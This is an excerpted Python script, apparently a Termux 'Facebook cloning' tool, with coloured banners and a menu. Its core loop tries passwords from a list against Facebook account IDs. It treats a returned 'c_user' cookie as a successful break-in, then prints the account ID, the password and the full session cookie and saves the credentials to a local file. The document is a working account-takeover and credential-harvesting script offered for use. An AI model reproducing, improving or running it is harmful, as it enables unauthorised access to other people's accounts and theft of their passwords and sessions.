...
os.system('xdg-open https://github.com/Jovanvau')
name=fuckx.upper()

psb('\x1b[1;31mBANGLADESH J0V4N CLONING START PLEASE WAIT ..........')
time.sleep(3)
...
| $$__| $$| $$_\$$$$   \$$ $$        | $$| $$ \$$$$      
 \$$    $$ \$$  \$$$    \$$$         | $$| $$  \$$$      
  ...
  \033[1;32m|     \033[1;33m[✓] CREATED BY\33[0;m   :  \033[1;33m Jovan Ahmed    \033[1;92m|
  \033[1;32m|     \033[1;32m[✓] FACEBOK      : \033[1;34m MD NURUL HAQ RONE             \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] GITHUB       :  \033[1;35mTOXIC-JOVAN           \033[1;92m|
  \033[1;32m|     \033[1;36m[✓] TOOL STATUS  :  \033[1;36mRandom Tools          \033[1;92m|
  \033[1;32m|     \033[1;35m[✓] TEAM         :  \033[1;35mTermux Free Commead                  \033[1;92m|
...
def main():
    ...
    banner()
    print(f' ')
    print(f'{M}╔══[ [•] TOOL NAME : {H}Random Fuck Love')
    print(f'{M}║══[ [•] YOR IP    : ')
    print(f'{M}║══[ [•] VERSION   : {H}1.0.9')
    print(f'{M}╚══[ [•] TOOL NAME : {H}Fuck Love RANDOM\n')
    ...
    if sh =='1':
       os.system('xdg-open https://https://www.facebook.com/i.love.allah.its.jovan.vau')
       sh6()
    if sh =='2':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                #os.system("play-audio Jovan-ok.mp3")
                print('    \033[1;92m[J0V4N-OK] '+uid+' | '+ps+'\033[0;97m')
                print(f'    {B}[NUMBER📳] {K}'+uid+'  ')
                print(f'    {B}[COOKI💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/Jovan-ok.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mJ0V4N","\x1b[1;92mJovan","\x1b[1;93mJovan","\x1b[1;94mJovan","\x1b[1;95mJovan","\x1b[1;96mJovan","\x1b[1;97mJOVAN","\x1b[1;91mJOVAN","\x1b[1;92mJOVAN","\x1b[1;93mJOVAN","\x1b[1;94mJOVAN","\x1b[1;95mJOVAN","\x1b[1;96mJOVAN"])
